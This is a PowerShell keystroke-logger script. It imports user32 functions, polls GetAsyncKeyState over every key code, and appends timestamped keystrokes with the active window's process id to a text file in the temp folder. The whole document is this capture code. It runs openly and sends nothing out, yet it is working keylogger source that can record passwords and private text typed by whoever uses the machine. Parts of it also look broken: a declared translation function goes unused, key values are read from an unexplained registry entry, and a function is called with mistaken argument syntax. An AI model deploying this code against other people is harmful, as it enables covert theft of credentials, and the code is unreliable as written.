## Def
# API declaration
$APIsignaturesWin32 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $APIsignaturesWin32 -Name 'Win32' -Namespace API -PassThru

$APIsignaturesUtils = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")]
public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out int ProcessId);
'@

Add-Type $APIsignaturesUtils -Name Utils -Namespace Win32
$myPid = [IntPtr]::Zero;

## Sub Functions
function get-activewin()
{
  $hwnd = [Win32.Utils]::GetForegroundWindow()
  $null = [Win32.Utils]::GetWindowThreadProcessId($hwnd, [ref] $myPid)
  $activewin = Get-Process| Where-Object ID -eq $myPid | Select-Object *
  $activewin
}


function output-line($logPath, $lst_str, $cnt){
  $activewin = get-activewin
  $line = (Get-Date).ToString($C_dateformat) + "`t"
  $line = $line + $activewin.Id + "`t"
  $line = $line + $cnt + "`t"
  $line = $line + $lst_str
  [System.IO.File]::AppendAllText($logPath, $line + "`r`n", $C_Encode)
  if($C_debug_mode){
    $logger.info.Invoke($line)
  }
}

## function
function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt") 
{
  # output file path
  if (Test-Path $logPath){
    $null
  }else{
    $null = New-Item -Path $logPath -ItemType File
    [System.IO.File]::AppendAllText($logPath, "datetime`tprocessid`tcount`tkeystrokes`r`n", $C_Encode)
  }
  # buf
  $lst = New-Object System.Collections.ArrayList
  $buf = ''
  
  try
  {
    $logger.warn.Invoke('Keylogger started. Press CTRL+C to see results...')
    $logger.info.Invoke("Output keystroke log to ... $logPath")
    
    $cnt = 0
    while ($true) {
      Start-Sleep -Milliseconds $C_waittime
      $starttime = Get-Date
      $flag = $true
      
      while ($flag) {
        for ($btKeyCode = 0; $btKeyCode -le 254; $btKeyCode++) {
          ## FIXME [ ] How can I get WheeelUp and WheelDown,etc.
          
          ## get key state
          $keystate = $API::GetAsyncKeyState($btKeyCode)
          
          ## if key pressed
          if ($keystate -eq -32767) {
            $null = [console]::CapsLock ##FIXME Why this line is written?
            $val = (Get-ItemProperty -path 'HKCU:\Software\GetKeypressValue').KeypressValue
            
            if($val.length -le 1){
              $buf = $buf + $val
              $cnt = $cnt + 1
            }else{
              if($buf -ne ""){
                $null = $lst.Add($buf)
              }
              if($C_exclusion_words -notcontains $val){
                if($val.length -ne 0){
                  $null = $lst.Add($val)
                  $cnt = $cnt + 1
                }
              }
              $buf = ""
            }
          }
          $endtime = Get-Date
          $secondstosleep = [int]($C_interval - ($endtime - $starttime).TotalSeconds)
          if($secondstosleep -le 0){
            $flag = $false
          } 
        }
      }
      $lst_ary = $lst.ToArray()
      $lst_str = [string]::Join(",",$lst_ary)
      output-line($logPath, $lst_str, $cnt)
      $i = 0
      $buf = ''
      $lst.Clear()
    }
  }
  finally
  { 
    $lst += $buf
    $lst_ary = $lst.ToArray()
    $lst_str = [string]::Join(",",$lst_ary)
    output-line($logPath, $lst_str, $cnt)
  }
}

## ---------------------------------------------------- // entry point
## include configs
$project_name = split-path $PWD.path -leaf
$config = "./$project_name.config.ps1"
. $config

## include logger
. ./Get-Logger.ps1

$logger = Get-Logger
$logger.info.Invoke("get config from $config")

Log-Keystrokes($C_output_path)
